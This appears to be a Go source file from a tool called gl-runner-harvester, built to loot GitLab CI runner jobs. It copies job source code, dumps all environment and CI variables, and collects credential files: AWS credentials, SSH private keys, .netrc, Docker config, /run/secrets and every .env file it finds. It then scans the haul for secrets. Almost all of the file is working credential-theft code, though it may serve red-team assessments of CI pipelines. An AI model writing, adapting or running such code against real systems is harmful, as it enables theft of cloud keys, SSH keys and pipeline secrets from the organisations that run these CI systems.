package harvester

import (
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"strings"
	"time"

	"github.com/frjcomp/gl-runner-harvester/internal/scanner"
	"github.com/rs/zerolog/log"
)

// Harvester collects source code, credentials, and environment variables from CI jobs.
type Harvester struct {
	outputDir   string
	scanSecrets bool
}

// New creates a new Harvester.
func New(outputDir string, scanSecrets bool) *Harvester {
	return &Harvester{outputDir: outputDir, scanSecrets: scanSecrets}
}

// JobData holds all harvested information for a single CI job.
type JobData struct {
	JobID        string            `json:"job_id"`
	Timestamp    time.Time         `json:"timestamp"`
	SourceDir    string            `json:"source_dir"`
	EnvVars      map[string]string `json:"env_vars"`
	CIVars       map[string]string `json:"ci_vars"`
	CredFiles    []string          `json:"cred_files"`
	ScanFindings []scanner.Finding `json:"scan_findings,omitempty"`
}

// HarvestJob harvests a specific job build directory.
func (h *Harvester) HarvestJob(jobDir string) error {
	jobID := deriveJobID(jobDir)
	return h.harvest(jobID, jobDir)
}

// HarvestCurrentEnv harvests the current process environment (for when we are
// already inside a CI job).
func (h *Harvester) HarvestCurrentEnv(jobID string) error {
	projectDir := os.Getenv("CI_PROJECT_DIR")
	return h.harvest(jobID, projectDir)
}

func (h *Harvester) harvest(jobID, sourceDir string) error {
	ts := time.Now()
	destRoot := filepath.Join(h.outputDir, fmt.Sprintf("%s_%s", jobID, ts.Format("20060102_150405")))

	if err := os.MkdirAll(destRoot, 0700); err != nil {
		return fmt.Errorf("create output dir: %w", err)
	}

	data := JobData{
		JobID:     jobID,
		Timestamp: ts,
		SourceDir: sourceDir,
		EnvVars:   collectEnvVars(),
		CIVars:    collectCIVars(),
	}

	// Copy source code.
	if sourceDir != "" {
		srcDest := filepath.Join(destRoot, "source")
		if err := copyDir(sourceDir, srcDest); err != nil {
			log.Warn().Err(err).Str("source", sourceDir).Msg("Could not copy source directory")
		} else {
			log.Info().Str("dest", srcDest).Msg("Source code copied")
		}
	}

	// Harvest credential files.
	data.CredFiles = harvestCredentialFiles(destRoot)

	// Secret scanning.
	if h.scanSecrets {
		findings, err := scanner.Scan(data.EnvVars, destRoot)
		if err != nil {
			log.Warn().Err(err).Msg("Secret scan failed")
		} else {
			data.ScanFindings = findings
			log.Info().Int("findings", len(findings)).Msg("Secret scan complete")
			for _, f := range findings {
				log.Warn().
					Str("type", f.Type).
					Str("severity", f.Severity).
					Str("location", f.Location).
					Msg("Secret finding")
			}
		}
	}

	// Write summary JSON.
	summaryPath := filepath.Join(destRoot, "summary.json")
	if err := writeSummary(summaryPath, data); err != nil {
		log.Error().Err(err).Msg("Failed to write summary")
	}

	log.Info().Str("output", destRoot).Str("job_id", jobID).Msg("Harvest complete")
	return nil
}

func deriveJobID(jobDir string) string {
	if id := os.Getenv("CI_JOB_ID"); id != "" {
		return id
	}
	return filepath.Base(jobDir)
}

func collectEnvVars() map[string]string {
	m := make(map[string]string)
	for _, e := range os.Environ() {
		k, v, _ := strings.Cut(e, "=")
		m[k] = v
	}
	return m
}

func collectCIVars() map[string]string {
	m := make(map[string]string)
	for _, e := range os.Environ() {
		k, v, _ := strings.Cut(e, "=")
		if strings.HasPrefix(k, "CI_") || strings.HasPrefix(k, "GITLAB_") {
			m[k] = v
		}
	}
	return m
}

// harvestCredentialFiles looks for common credential files and copies them to destRoot/creds/.
func harvestCredentialFiles(destRoot string) []string {
	home, _ := os.UserHomeDir()
	candidates := []string{
		filepath.Join(home, ".netrc"),
		filepath.Join(home, ".aws", "credentials"),
		filepath.Join(home, ".aws", "config"),
		filepath.Join(home, ".ssh", "id_rsa"),
		filepath.Join(home, ".ssh", "id_ed25519"),
		filepath.Join(home, ".ssh", "id_ecdsa"),
		filepath.Join(home, ".ssh", "config"),
		filepath.Join(home, ".docker", "config.json"),
		"/run/secrets",
	}

	// Recursively search for .env files in the current working directory.
	if cwd, err := os.Getwd(); err == nil {
		_ = filepath.WalkDir(cwd, func(path string, d os.DirEntry, err error) error {
			if err == nil && !d.IsDir() && d.Name() == ".env" {
				candidates = append(candidates, path)
			}
			return nil
		})
	}

	credDir := filepath.Join(destRoot, "creds")
	var found []string

	for _, c := range candidates {
		info, err := os.Stat(c)
		if err != nil {
			continue
		}
		if err := os.MkdirAll(credDir, 0700); err != nil {
			continue
		}
		dest := filepath.Join(credDir, filepath.Base(c))
		if info.IsDir() {
			if err := copyDir(c, filepath.Join(credDir, filepath.Base(c))); err == nil {
				found = append(found, c)
			}
		} else {
			if err := copyFile(c, dest); err == nil {
				found = append(found, c)
				log.Info().Str("file", c).Msg("Credential file harvested")
			}
		}
	}
	return found
}

func writeSummary(path string, data JobData) error {
	f, err := os.Create(path)
	if err != nil {
		return err
	}
	defer f.Close()
	enc := json.NewEncoder(f)
	enc.SetIndent("", "  ")
	return enc.Encode(data)
}

func copyFile(src, dst string) error {
	in, err := os.Open(src)
	if err != nil {
		return err
	}
	defer in.Close()

	if err := os.MkdirAll(filepath.Dir(dst), 0700); err != nil {
		return err
	}

	out, err := os.Create(dst)
	if err != nil {
		return err
	}
	defer out.Close()

	_, err = io.Copy(out, in)
	return err
}

func copyDir(src, dst string) error {
	return filepath.Walk(src, func(path string, info os.FileInfo, err error) error {
		if err != nil {
			return nil // skip unreadable paths
		}
		rel, err := filepath.Rel(src, path)
		if err != nil {
			return err
		}
		target := filepath.Join(dst, rel)
		if info.IsDir() {
			return os.MkdirAll(target, 0700)
		}
		return copyFile(path, target)
	})
}
